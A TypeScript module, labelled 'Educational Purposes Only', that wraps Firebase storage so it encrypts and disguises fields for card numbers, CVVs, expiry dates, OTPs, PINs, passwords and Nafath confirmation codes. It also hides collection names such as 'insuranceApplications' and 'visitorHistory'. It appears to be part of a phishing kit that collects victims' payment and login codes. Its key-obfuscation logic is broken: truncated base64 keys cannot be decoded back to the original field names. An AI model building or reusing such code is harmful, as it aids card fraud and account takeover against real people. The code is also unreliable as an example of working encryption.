/**
 * Secure Firebase Operations - Educational Purposes Only
 * Encrypts sensitive data before storing
 */

import { addData as originalAddData, updateDoc as originalUpdateDoc } from './firebase'
import { _e, _d, _ef, _df, _l, _gf } from './secure-utils'

// Obfuscated field names mapping
const sensitiveFields = [
  'cardNumber',
  'cvv',
  'expiryDate',
  'cardHolderName',
  'otp',
  'pinCode',
  'password',
  'nafadConfirmationCode'
]

// Check if field is sensitive
function isSensitive(key: string): boolean {
  return sensitiveFields.includes(key)
}

// Encrypt sensitive data
export async function secureAddData(data: Record<string, any>): Promise<void> {
  _l('Encrypting data before storage')
  
  const encrypted: Record<string, any> = {}
  
  Object.keys(data).forEach(key => {
    if (isSensitive(key) && typeof data[key] === 'string') {
      // Encrypt sensitive fields
      const obfuscatedKey = btoa(key).substring(0, 12)
      encrypted[obfuscatedKey] = _e(data[key])
      _l(`Encrypted field: ${key}`)
    } else {
      // Keep non-sensitive as is
      encrypted[key] = data[key]
    }
  })
  
  await originalAddData(encrypted)
}

// Decrypt sensitive data
export async function secureGetData(docId: string, originalData: Record<string, any>): Promise<Record<string, any>> {
  _l('Decrypting data from storage')
  
  const decrypted: Record<string, any> = { ...originalData }
  
  Object.keys(originalData).forEach(key => {
    try {
      // Try to decode key
      const decodedKey = atob(key)
      
      if (isSensitive(decodedKey) && typeof originalData[key] === 'string') {
        // Decrypt sensitive fields
        decrypted[decodedKey] = _d(originalData[key])
        delete decrypted[key] // Remove obfuscated key
        _l(`Decrypted field: ${decodedKey}`)
      }
    } catch {
      // Not an obfuscated key, keep as is
    }
  })
  
  return decrypted
}

// Secure update with encryption
export async function secureUpdateDoc(docRef: any, data: Record<string, any>): Promise<void> {
  _l('Encrypting update data')
  
  const encrypted: Record<string, any> = {}
  
  Object.keys(data).forEach(key => {
    if (isSensitive(key) && typeof data[key] === 'string') {
      // Encrypt sensitive fields
      const obfuscatedKey = btoa(key).substring(0, 12)
      encrypted[obfuscatedKey] = _e(data[key])
    } else {
      encrypted[key] = data[key]
    }
  })
  
  return await originalUpdateDoc(docRef, encrypted)
}

// Obfuscate collection names
export function getCollectionName(type: 'applications' | 'history' | 'settings'): string {
  const mapping = {
    applications: process.env.NEXT_PUBLIC_C1 || 'insuranceApplications',
    history: process.env.NEXT_PUBLIC_C2 || 'visitorHistory',
    settings: process.env.NEXT_PUBLIC_C3 || 'settings'
  }
  
  const encoded = mapping[type]
  try {
    return atob(encoded)
  } catch {
    return encoded
  }
}

// Runtime field name generator
let _fieldCache: Record<string, string> | null = null

export function getFieldName(field: string): string {
  if (!_fieldCache) {
    // Generate random field names at runtime
    _fieldCache = {}
    sensitiveFields.forEach(f => {
      const random = Math.random().toString(36).substring(2, 10)
      _fieldCache![f] = `_${random}_${btoa(f).substring(0, 6)}`
    })
  }
  
  return _fieldCache[field] || field
}

// Reverse lookup
export function getRealFieldName(obfuscated: string): string {
  if (!_fieldCache) return obfuscated
  
  for (const [real, obf] of Object.entries(_fieldCache)) {
    if (obf === obfuscated) return real
  }
  
  return obfuscated
}
